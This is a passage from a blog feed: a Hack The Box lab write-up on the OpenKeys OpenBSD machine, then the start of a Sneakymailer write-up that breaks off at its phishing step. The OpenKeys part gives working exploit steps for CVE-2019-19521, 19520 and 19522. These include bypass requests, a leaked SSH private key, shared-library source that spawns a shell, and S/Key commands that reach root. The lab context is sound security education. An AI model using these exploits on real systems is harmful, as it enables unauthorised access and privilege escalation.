&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;b0VIM 8.1�-�^���jenniferopenkeys.htb/var/www/htdocs/includes/auth.php 3210#&amp;quot;! Utp=ad� � =����sWB@?&amp;quot; �������mgC� � � { a W J @ �������vpnmUS0���J� � � � � � � � � � � ?&amp;gt;} session_start(); session_destroy(); session_unset();{function close_session()} $_SESSION[&amp;quot;username&amp;quot;] = $_REQUEST[&amp;#39;username&amp;#39;]; $_SESSION[&amp;quot;user_agent&amp;quot;] = $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]; $_SESSION[&amp;quot;remote_addr&amp;quot;] = $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;]; $_SESSION[&amp;quot;last_activity&amp;quot;] = $_SERVER[&amp;#39;REQUEST_TIME&amp;#39;]; $_SESSION[&amp;quot;login_time&amp;quot;] = $_SERVER[&amp;#39;REQUEST_TIME&amp;#39;]; $_SESSION[&amp;quot;logged_in&amp;quot;] = True;{function init_session()} } return False; { else } } return True; $_SESSION[&amp;#39;last_activity&amp;#39;] = $time; // Session is active, update last activity time and return True { else } return False; close_session(); { ($time - $_SESSION[&amp;#39;last_activity&amp;#39;]) &amp;gt; $session_timeout) if (isset($_SESSION[&amp;#39;last_activity&amp;#39;]) &amp;amp;&amp;amp; $time = $_SERVER[&amp;#39;REQUEST_TIME&amp;#39;]; // Has the session expired? { if(isset($_SESSION[&amp;quot;logged_in&amp;quot;])) // Is the user logged in? session_start(); // Start the session $session_timeout = 300; // Session timeout in seconds{function is_active_session()} return $retcode; system($cmd, $retcode); $cmd = escapeshellcmd(&amp;quot;../auth_helpers/check_auth &amp;quot; . $username . &amp;quot; &amp;quot; . $password);{function authenticate($username, $password)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few Google research ("OpenBsd check_auth exploit") lead us to two blog articles
presenting four 2019 CVE allowing to bypass authentication and escalate
privileges on openbsd:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/"&gt;secpod article&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt"&gt;qualys article&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="cve-2019-1952"&gt;CVE-2019-1952&lt;/h2&gt;
&lt;p&gt;We use the CVE-2019-19521 to bypass the authentication using the username
&lt;code&gt;-schallenge&lt;/code&gt;. But the application tell us that there is no key found for the
user &lt;code&gt;-schallenge&lt;/code&gt;. We want to authenticate as &lt;code&gt;jennifer&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenSSH key not found for user -schallenge&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We fire up Burp and add a &lt;code&gt;username=jennifier&lt;/code&gt; cookie to our authentication
request.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /index.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.199&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Referer: http://10.10.10.199/index.php&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 31&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=5j485ne4sih5h7dl0fk2f2e8g7;username=jennifer&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;username=-schallenge&amp;amp;password=q&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We also add the cookie to the next request to &lt;code&gt;sshkey.php&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /sshkey.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.199&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Referer: http://10.10.10.199/index.php&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=jma32i3d8r5ob3lmo3hbgi741a;username=jennifer&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The application directly give us Jennifer's SSH private key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEAo4LwXsnKH6jzcmIKSlePCo/2YWklHnGn50YeINLm7LqVMDJJnbNx&lt;/span&gt;
&lt;span class="code-line"&gt;OI6lTsb9qpn0zhehBS2RCx/i6YNWpmBBPCy6s2CxsYSiRd3S7NftPNKanTTQFKfOpEn7rG&lt;/span&gt;
&lt;span class="code-line"&gt;nag+n7Ke+iZ1U/FEw4yNwHrrEI2pklGagQjnZgZUADzxVArjN5RsAPYE50mpVB7JO8E7DR&lt;/span&gt;
&lt;span class="code-line"&gt;PWCfMNZYd7uIFBVRrQKgM/n087fUyEyFZGibq8BRLNNwUYidkJOmgKSFoSOa9+6B0ou5oU&lt;/span&gt;
&lt;span class="code-line"&gt;qjP7fp0kpsJ/XM1gsDR/75lxegO22PPfz15ZC04APKFlLJo1ZEtozcmBDxdODJ3iTXj8Js&lt;/span&gt;
&lt;span class="code-line"&gt;kLV+lnJAMInjK3TOoj9F4cZ5WTk29v/c7aExv9zQYZ+sHdoZtLy27JobZJli/9veIp8hBG&lt;/span&gt;
&lt;span class="code-line"&gt;717QzQxMmKpvnlc76HLigzqmNoq4UxSZlhYRclBUs3l5CU9pdsCb3U1tVSFZPNvQgNO2JD&lt;/span&gt;
&lt;span class="code-line"&gt;S7O6sUJFu6mXiolTmt9eF+8SvEdZDHXvAqqvXqBRAAAFmKm8m76pvJu+AAAAB3NzaC1yc2&lt;/span&gt;
&lt;span class="code-line"&gt;EAAAGBAKOC8F7Jyh+o83JiCkpXjwqP9mFpJR5xp+dGHiDS5uy6lTAySZ2zcTiOpU7G/aqZ&lt;/span&gt;
&lt;span class="code-line"&gt;9M4XoQUtkQsf4umDVqZgQTwsurNgsbGEokXd0uzX7TzSmp000BSnzqRJ+6xp2oPp+ynvom&lt;/span&gt;
&lt;span class="code-line"&gt;dVPxRMOMjcB66xCNqZJRmoEI52YGVAA88VQK4zeUbAD2BOdJqVQeyTvBOw0T1gnzDWWHe7&lt;/span&gt;
&lt;span class="code-line"&gt;iBQVUa0CoDP59PO31MhMhWRom6vAUSzTcFGInZCTpoCkhaEjmvfugdKLuaFKoz+36dJKbC&lt;/span&gt;
&lt;span class="code-line"&gt;f1zNYLA0f++ZcXoDttjz389eWQtOADyhZSyaNWRLaM3JgQ8XTgyd4k14/CbJC1fpZyQDCJ&lt;/span&gt;
&lt;span class="code-line"&gt;4yt0zqI/ReHGeVk5Nvb/3O2hMb/c0GGfrB3aGbS8tuyaG2SZYv/b3iKfIQRu9e0M0MTJiq&lt;/span&gt;
&lt;span class="code-line"&gt;b55XO+hy4oM6pjaKuFMUmZYWEXJQVLN5eQlPaXbAm91NbVUhWTzb0IDTtiQ0uzurFCRbup l4qJU5rfXhfvErxHWQx17wKqr16gUQAAAAMBAAEAAAGBAJjT/uUpyIDVAk5L8oBP3IOr0U&lt;/span&gt;
&lt;span class="code-line"&gt;Z051vQMXZKJEjbtzlWn7C/n+0FVnLdaQb7mQcHBThH/5l+YI48THOj7a5uUyryR8L3Qr7A&lt;/span&gt;
&lt;span class="code-line"&gt;UIfq8IWswLHTyu3a+g4EVnFaMSCSg8o+PSKSN4JLvDy1jXG3rnqKP9NJxtJ3MpplbG3Wan&lt;/span&gt;
&lt;span class="code-line"&gt;j4zU7FD7qgMv759aSykz6TSvxAjSHIGKKmBWRL5MGYt5F03dYW7+uITBq24wrZd38NrxGt&lt;/span&gt;
&lt;span class="code-line"&gt;wtKCVXtXdg3ROJFHXUYVJsX09Yv5tH5dxs93Re0HoDSLZuQyIc5iDHnR4CT+0QEX14u3EL&lt;/span&gt;
&lt;span class="code-line"&gt;TxaoqT6GBtynwP7Z79s9G5VAF46deQW6jEtc6akIbcyEzU9T3YjrZ2rAaECkJo4+ppjiJp&lt;/span&gt;
&lt;span class="code-line"&gt;NmDe8LSyaXKDIvC8lb3b5oixFZAvkGIvnIHhgRGv/+pHTqo9dDDd+utlIzGPBXsTRYG2Vz&lt;/span&gt;
&lt;span class="code-line"&gt;j7Zl0cYleUzPXdsf5deSpoXY7axwlyEkAXvavFVjU1UgZ8uIqu8W1BiODbcOK8jMgDkQAA&lt;/span&gt;
&lt;span class="code-line"&gt;AMB0rxI03D/q8PzTgKml88XoxhqokLqIgevkfL/IK4z8728r+3jLqfbR9mE3Vr4tPjfgOq&lt;/span&gt;
&lt;span class="code-line"&gt;eaCUkHTiEo6Z3TnkpbTVmhQbCExRdOvxPfPYyvI7r5wxkTEgVXJTuaoUJtJYJJH2n6bgB3&lt;/span&gt;
&lt;span class="code-line"&gt;WIQfNilqAesxeiM4MOmKEQcHiGNHbbVW+ehuSdfDmZZb0qQkPZK3KH2ioOaXCNA0h+FC+g&lt;/span&gt;
&lt;span class="code-line"&gt;dhqTJhv2vl1X/Jy/assyr80KFC9Eo1DTah2TLnJZJpuJjENS4AAADBAM0xIVEJZWEdWGOg&lt;/span&gt;
&lt;span class="code-line"&gt;G1vwKHWBI9iNSdxn1c+SHIuGNm6RTrrxuDljYWaV0VBn4cmpswBcJ2O+AOLKZvnMJlmWKy&lt;/span&gt;
&lt;span class="code-line"&gt;Dlq6MFiEIyVKqjv0pDM3C2EaAA38szMKGC+Q0Mky6xvyMqDn6hqI2Y7UNFtCj1b/aLI8cB&lt;/span&gt;
&lt;span class="code-line"&gt;rfBeN4sCM8c/gk+QWYIMAsSWjOyNIBjy+wPHjd1lDEpo2DqYfmE8MjpGOtMeJjP2pcyWF6&lt;/span&gt;
&lt;span class="code-line"&gt;CxcVbm6skasewcJa4Bhj/MrJJ+KjpIjQAAAMEAy/+8Z+EM0lHgraAXbmmyUYDV3uaCT6ku&lt;/span&gt;
&lt;span class="code-line"&gt;Alz0bhIR2/CSkWLHF46Y1FkYCxlJWgnn6Vw43M0yqn2qIxuZZ32dw1kCwW4UNphyAQT1t5&lt;/span&gt;
&lt;span class="code-line"&gt;eXBJSsuum8VUW5oOVVaZb1clU/0y5nrjbbqlPfo5EVWu/oE3gBmSPfbMKuh9nwsKJ2fi0P&lt;/span&gt;
&lt;span class="code-line"&gt;bp1ZxZvcghw2DwmKpxc+wWvIUQp8NEe6H334hC0EAXalOgmJwLXNPZ+nV6pri4qLEM6mcT&lt;/span&gt;
&lt;span class="code-line"&gt;qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=&lt;/span&gt;
&lt;span class="code-line"&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can connect to the box using this key and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh jennifer@10.10.10.199 -i id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;snip&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;36ab21239a15c537bde90626891d2b10&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;The articles used to bypass the authentication give us a few leads about the
privilege escalation.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openkeys$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We will use CVE-2019-19520 to gain access to the group &lt;code&gt;auth&lt;/code&gt; and then use CVE-2019-19522
to get &lt;code&gt;root&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="cve-2019-19520"&gt;CVE-2019-19520&lt;/h2&gt;
&lt;p&gt;First we create a temporary folder &lt;code&gt;/tmp/.plop&lt;/code&gt; and create the file &lt;code&gt;swrast_dri.c&lt;/code&gt;
with the following content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;paths.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;static&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;__attribute__&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_init&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;gid_t&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;egid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;rgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;egid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__LINE__&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sgid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__LINE__&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;_PATH_KSHELL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__LINE__&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then compile it and run the command to get access to the &lt;code&gt;auth&lt;/code&gt; group. &lt;em&gt;As
the author of the box implemented so cleanup script the commands needs to be run
"quickly"&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Personal note: The two command need to be &amp;quot;quickly run&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &amp;amp;&lt;/span&gt;
&lt;span class="code-line"&gt;[1] 42553&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys$ _XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.&lt;/span&gt;
&lt;span class="code-line"&gt;env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we are now in the &lt;code&gt;auth&lt;/code&gt; group we can use the CVE-2019-19522.&lt;/p&gt;
&lt;h2 id="cve-2019-19522"&gt;CVE-2019-19522&lt;/h2&gt;
&lt;p&gt;We just put the command as specified in the article and get the root flag (the
Password is not printed so I put it between bracket).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;openkeys$ echo &amp;#39;root md5 0100 obsd91335 8b6d96e0ef1b1c21&amp;#39; &amp;gt; /etc/skey/root&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys$ chmod 0600 /etc/skey/root&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys$ env -i TERM=vt220 su -l -a skey&lt;/span&gt;
&lt;span class="code-line"&gt;otp-md5 99 obsd91335&lt;/span&gt;
&lt;span class="code-line"&gt;S/Key Password: [EGG LARD GROW HOG DRAG LAIN]&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)&lt;/span&gt;
&lt;span class="code-line"&gt;openkeys# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;f3a553b1697050ae885e7c02dbfc6efa&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was quit easy once the &lt;a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt"&gt;qualys article&lt;/a&gt;
was found. I was hoping for more specific OpenBSD content. Nevertheless this
was a fun box to root. I will probably recommend this box to beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="OpenBSD"></category><category term="CVE"></category></entry><entry><title>HTB: Sneakymailer</title><link href="https://maggick.fr/2020/12/htb-sneakymailer.html" rel="alternate"></link><published>2020-12-03T07:20:00+01:00</published><updated>2020-12-03T07:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-03:/2020/12/htb-sneakymailer.html</id><summary type="html">&lt;p&gt;&lt;img alt="Sneakymailer Card" class="align-left" src="/media/2020.12/sneakymailer_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/262"&gt;Sneakymailer&lt;/a&gt; publish on
July 11, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/106709"&gt;sulcud&lt;/a&gt;.
This box is rated as a medium box. It implies some phishing, an IMAP server, a
FTP server, Pypi and sudo.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.12/sneakymailer_card.png" alt="Sneakymailer Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/262"&gt;Sneakymailer&lt;/a&gt; publish on
July 11, 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/106709"&gt;sulcud&lt;/a&gt;.
This box is rated as a medium box. It implies some phishing, an IMAP server, a
FTP server, Pypi and sudo.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sat Jul 25 03:42:58 2020 as: nmap -p- -sSV -oN nmap 10.10.10.197&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.197&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.079s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65528 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp   open  ftp      vsftpd 3.0.3&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;25/tcp   open  smtp     Postfix smtpd&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http     nginx 1.14.2&lt;/span&gt;
&lt;span class="code-line"&gt;143/tcp  open  imap     Courier Imapd (released 2018)&lt;/span&gt;
&lt;span class="code-line"&gt;993/tcp  open  ssl/imap Courier Imapd (released 2018)&lt;/span&gt;
&lt;span class="code-line"&gt;8080/tcp open  http     nginx 1.14.2&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;There is a few open ports:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;21 FTP&lt;/li&gt;
&lt;li&gt;22 SSH&lt;/li&gt;
&lt;li&gt;25 SMTPD (email)&lt;/li&gt;
&lt;li&gt;80 Nginx (web)&lt;/li&gt;
&lt;li&gt;143 imap (mail)&lt;/li&gt;
&lt;li&gt;993 imap/ssl (mail)&lt;/li&gt;
&lt;li&gt;8080 nginx (mail)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;When browsing the website we notice a list of email addresses. We copy them to a
file an use &lt;code&gt;cut -f 4&lt;/code&gt; to get a proper list with the email only.&lt;/p&gt;
&lt;p&gt;Nothing else on the website seems of interest.&lt;/p&gt;
&lt;h2 id="phishing"&gt;Phishing&lt;/h2&gt;
